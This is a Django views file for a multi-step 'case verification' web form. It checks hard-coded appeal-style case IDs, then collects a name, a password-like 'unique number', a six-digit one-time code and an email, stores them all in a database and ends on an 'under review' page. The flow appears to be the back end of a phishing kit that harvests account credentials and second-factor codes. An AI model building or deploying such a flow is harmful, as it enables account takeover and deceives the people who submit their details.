# main/views.py
from django.shortcuts import render, redirect
from django.contrib import messages
from .models import UserSubmission


VALID_CASE_IDS = {
    'APL-2024-1234',
    'APL-2024-5678',
    'APL-2024-9123'
}

def index(request):
    error = None
    if request.method == 'POST':
        # Get case ID from POST data
        case_id = request.POST.get('case_id', '').strip()
        
        if case_id in VALID_CASE_IDS:
            # Store verification in session
            request.session['verified_case'] = case_id
            request.session.modified = True  # Force session save
            return redirect('terms_of_use')
        else:
            error = "Invalid Case ID. Please check your entry."
    
    return render(request, 'main/index.html', {'error': error})

def terms_of_use(request):
    if not request.session.get('verified_case'):
        return redirect('index')

    if request.method == 'POST':
        # Check if both checkboxes are checked
        if all([
            request.POST.get('terms') == 'on',
            request.POST.get('privacy') == 'on'
        ]):
            request.session['accepted_terms'] = True
            return redirect('Idusername')
        
        messages.error(request, "You must accept both agreements to continue")
    
    return render(request, 'main/terms_of_use.html')


def Idusername(request):
    if request.method == 'POST':
        full_name = request.POST.get('name', '').strip()
        UserSubmission.objects.create(name=full_name)
        request.session['collected_name'] = True      # ← add this
        return redirect('idpassword')
    return render(request, 'main/Idusername.html')

def idpassword(request):
    # Verify previous steps
    if not request.session.get('verified_case') or not request.session.get('accepted_terms'):
        return redirect('index')  # Redirect to start if missing steps
    
    if request.method == 'POST':
        unique_number = request.POST.get('unique_number', '').strip()
        
        # Simple validation - adjust as needed
        if len(unique_number) >= 6:  # Example minimum length
            # Save to database
            submission = UserSubmission.objects.latest('created_at')
            submission.unique_number = unique_number
            submission.save()
            
            # Set session flag and redirect
            request.session['collected_unique_number'] = True
            return redirect('sessionpage')  # Direct to session page
            
        messages.error(request, "Invalid number format")
    
    return render(request, 'main/idpassword.html')


def collect_session_number(request):
    if not request.session.get('collected_unique_number'):
        return redirect('idpassword')  # Ensure previous step is completed

    if request.method == 'POST':
        session_number = request.POST.get('code', '').strip()
        if len(session_number) == 6 and session_number.isdigit():
            try:
                submission = UserSubmission.objects.latest('created_at')
                submission.session_number = session_number
                submission.save()
                request.session['collected_session_number'] = True
                return redirect('confirmationpage')
            except UserSubmission.DoesNotExist:
                messages.error(request, "No submission found to update.")
        else:
            messages.error(request, "Invalid session number format.")

    return render(request, 'main/sessionpage.html')


def confirmationpage(request):
    if request.method == 'POST':
        email = request.POST.get('result_email', '').strip()
        if email:
            submission = UserSubmission.objects.latest('created_at')
            submission.email = email
            submission.save()
            messages.success(request, "Email recorded; redirecting to final confirmation.")
            return redirect('completionpage')
        messages.error(request, "Please provide a valid email address.")
    return render(request, 'main/confirmationpage.html')

def completionpage(request):
    """
    Renders the final completion page informing the user that
    all their information has been received and is under review.
    """
    return render(request, 'main/completionpage.html')